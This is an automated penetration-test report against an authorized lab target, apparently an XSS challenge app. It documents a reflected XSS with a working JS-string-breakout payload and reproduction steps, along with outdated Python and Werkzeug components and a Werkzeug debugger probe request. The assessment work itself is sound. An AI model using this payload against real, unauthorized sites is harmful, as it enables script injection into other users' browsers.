# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. HIGH — xss-reflected Reflected XSS via JS-string injection in name param (GET /page)](#finding-1)
    - [2. MEDIUM — vulnerable-component End-of-life Python 2.7.18 runtime — unpatched CVEs (CVE-2021-3177, CVE-2021-23336)](#finding-2)
    - [3. MEDIUM — vulnerable-component Outdated Werkzeug 1.0.1 — known DoS CVEs (CVE-2023-25577, CVE-2024-49767) + conditional debugger RCE (CVE-2024-34069)](#finding-3)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mqz52bhu-3y7bo1` |
| Target | http://target.local:32875/ |
| Started | 2026-06-29T11:32:53.534Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 2 mapped · 2 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 3 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32875`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

3 finding(s): 1 high, 2 medium

## Findings

<a id="finding-1"></a>

### 1. [HIGH] [xss-reflected] Reflected XSS via JS-string injection in name param (GET /page)

- Screen: `s-0002`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32875/

The `name` query parameter is reflected server-side directly into a `<script>` block as a double-quoted JavaScript string literal: `var name = "VALUE"; document.write('Hello ' + name);`. The server escapes `"` → `\"` and `\` → `\\` independently, but the combination `\"` in the input produces `\\"` in the output — in JavaScript, `\\` is a literal backslash and the following `"` closes the string, allowing arbitrary code execution. Sending `?name=\";alert(1)//` causes `alert(1)` to execute; the challenge app's server-side JS executor confirms this with the response message "You did an alert with 1 instead of 'XSS'".

**Reproduction**

```
1. GET http://target.local:32875/page?name=%5C%22%3Balert%281%29%2F%2F (URL-decoded: name=\";alert(1)//)\n2. Observe the injected script block: `var name = "\\"`;alert(1)//";`\n3. In the browser, `\\` evaluates to a literal backslash, the following `"` closes the string, and `;alert(1)` executes.\n4. Server response confirms: "You did an alert with 1 instead of 'XSS'"
```

**Evidence**

- Evidence `ev-mqz57v71-d` — `artifacts/s-0002/ev-mqz57v71-d/`

Request:

```http
GET /page HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1009
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:37:12 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss30.css">
            <title>Dalgona - Umbrella</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text"><script> var name = ""; document.write('Hello ' + name); </script></div>
                    <div class="solution-text"><img src="static/img/cookies/new_umbrella.png" alt="Start" width="150" height="150"><br>Let the game begin. Good Luck</div>
                    <input type=text name=name placeholder="Enter your name..." value="">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqz5a61t-i` — `artifacts/s-0002/ev-mqz5a61t-i/`

Request:

```http
GET /page?name=%5C%22%3Balert%281%29%2F%2F HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1041
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:38:59 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss30.css">
            <title>Dalgona - Umbrella</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text"><script> var name = "\\";alert(1)//"; document.write('Hello ' + name); </script></div>
                    <div class="solution-text"><img src="static/img/cookies/error_umbrella.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with 1 instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." value="">
                </form>
            </div>
        </div>
    </html>
```

- Evidence `ev-mqz5bd3a-k` — `artifacts/s-0002/ev-mqz5bd3a-k/`

Request:

```http
GET /page?name=%5C%22%3Balert%281%29%2F%2F HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1041
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:39:55 GMT
server: Werkzeug/1.0.1 Python/2.7.18
x-xss-protection: 0


    <html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/xss30.css">
            <title>Dalgona - Umbrella</title>
        </head>

        <article class="widget widget__login">
        <div class="widget__content">
            <div class="box">
                <form class="box-form">
                    <img class="text-img" src="static/img/logo5_white.png">
                    <div class="solution-text"><script> var name = "\\";alert(1)//"; document.write('Hello ' + name); </script></div>
                    <div class="solution-text"><img src="static/img/cookies/error_umbrella.png" alt="Fail" width="150" height="150"><br>Oops! You did an alert with 1 instead of "XSS"</div>
                    <input type=text name=name placeholder="Enter your name..." value="">
                </form>
            </div>
        </div>
    </html>
```

<a id="finding-2"></a>

### 2. [MEDIUM] [vulnerable-component] End-of-life Python 2.7.18 runtime — unpatched CVEs (CVE-2021-3177, CVE-2021-23336)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32875/

The application runs on Python 2.7.18, disclosed in the HTTP Server response header on every response: `Server: Werkzeug/1.0.1 Python/2.7.18` (observed repeatedly on GET /). Python 2.7.18 (April 2020) is the FINAL Python 2 release; Python 2 reached end-of-life on 2020-01-01 and receives NO further security patches. Any CVE found after that date is permanently unpatched here, including: CVE-2021-3177 (stack buffer overflow in `PyCArg_repr` / `_ctypes/callproc.c`, memory corruption / potential RCE when ctypes processes attacker-influenced floats), CVE-2021-23336 (`urllib.parse` query-parameter smuggling → web-cache poisoning via `;`), and CVE-2022-0391 (`urllib.parse` control-character stripping). VERSION-BASED finding: matched from the Server banner, not exploited. The version is confirmed by the banner but the individual CVEs were NOT actively triggered — CVE-2021-3177 in particular is conditional on the app passing attacker-controlled data into ctypes. Operator should verify the interpreter and migrate off Python 2. Note: the Werkzeug dev WSGI server is being used to serve the app, which is not intended for production exposure.

**Reproduction**

```
1. Send `GET /` to http://target.local:32875/. 2. Inspect the response `Server` header: `Werkzeug/1.0.1 Python/2.7.18`. 3. Cross-reference 2.7.18 as the terminal, EOL Python 2 release with no patches for CVE-2021-3177 / CVE-2021-23336 / CVE-2022-0391.
```

**Evidence**

- Evidence `ev-mqz5gw0u-w` — `artifacts/_/ev-mqz5gw0u-w/`

Request:

```http
GET /nonexistent-verdict-control-xyz HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:44:13 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqz5fh6s-t` — `artifacts/_/ev-mqz5fh6s-t/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:43:07 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqz5gt29-u` — `artifacts/_/ev-mqz5gt29-u/`

Request:

```http
GET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:44:09 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

<a id="finding-3"></a>

### 3. [MEDIUM] [vulnerable-component] Outdated Werkzeug 1.0.1 — known DoS CVEs (CVE-2023-25577, CVE-2024-49767) + conditional debugger RCE (CVE-2024-34069)

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32875/

The WSGI layer is Werkzeug 1.0.1 (March 2020), disclosed in the Server response header on every response: `Server: Werkzeug/1.0.1 Python/2.7.18` (observed repeatedly on GET /). Known issues fixed in later releases that affect 1.0.1: CVE-2023-25577 (MultiPartParser resource exhaustion / DoS via many multipart parts, fixed 2.2.3), CVE-2024-49767 (`max_form_memory_size` not enforced on multipart parts → memory-exhaustion DoS, fixed 3.0.6), and CVE-2023-23934 (cookie-parsing edge case, low). CVE-2024-34069 (interactive-debugger RCE under cross-site + PIN-entry conditions, fixed 3.0.3) applies by version — HOWEVER an active probe for the debugger resource (`GET /?__debugger__=yes&cmd=resource&f=debugger.js`) returned the normal application page rather than the debugger JavaScript, indicating the interactive debugger / debug mode is NOT exposed, so the debugger RCE is not exploitable as deployed. VERSION-BASED finding matched from the Server banner; the DoS CVEs were not actively triggered (a DoS test is destructive / out of scope). Severity set by the worst SAFELY-applicable issue (DoS, medium); the conditional debugger RCE is downgraded because the active check shows it is not exposed. Recommendation: upgrade Werkzeug to a current 3.x release and stop serving via the Werkzeug development server.

**Reproduction**

```
1. Send `GET /` to http://target.local:32875/. 2. Inspect the `Server` header: `Werkzeug/1.0.1 Python/2.7.18`. 3. Map 1.0.1 against fixed-in versions: CVE-2023-25577 (<2.2.3), CVE-2024-49767 (<3.0.6), CVE-2024-34069 (<3.0.3). 4. Debugger exposure actively checked via `GET /?__debugger__=yes&cmd=resource&f=debugger.js` → returned the normal page (not debugger JS), so debug console is not exposed.
```

**Evidence**

- Evidence `ev-mqz5gw0u-w` — `artifacts/_/ev-mqz5gw0u-w/`

Request:

```http
GET /nonexistent-verdict-control-xyz HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
content-length: 232
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:44:13 GMT
server: Werkzeug/1.0.1 Python/2.7.18

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

- Evidence `ev-mqz5fh6s-t` — `artifacts/_/ev-mqz5fh6s-t/`

Request:

```http
GET / HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:43:07 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```

- Evidence `ev-mqz5gt29-u` — `artifacts/_/ev-mqz5gt29-u/`

Request:

```http
GET /?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1
Host: target.local:32875
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
content-length: 1090
content-type: text/html; charset=utf-8
date: Mon, 29 Jun 2026 11:44:09 GMT
server: Werkzeug/1.0.1 Python/2.7.18


    	<html>
        <head>
            <link rel="shortcut icon" href="static/assets/fav-icon.png">
            <link rel="stylesheet" type="text/css" href="static/css/style.css">
            <link rel="stylesheet" type="text/css" href="static/css/xss/index.css">
            <title>Dalgona Challenges</title>
        </head>

	        <article class="widget widget__login">
	        <div class="widget__content">
	    		<div class="box">
	                <form class="box-form">
	                    <img class="text-img" src="static/img/logo5_white.png">
				        <h1>Dalgona Challenges</h1>
	                    <div class="init-table">
                            <div class="row">
                                <div class="column"><a class="text" type=text href="page"><img src="static/img/cookies/new_star.png" alt="Star" width="150" height="150">Page</a></div>
				            </div>
                        </br>
				        </div>
				        </br>
				        </br>
				        <p></p>
	                </form>
	                </br>
				</div>
	        </div>
	    </html>
```
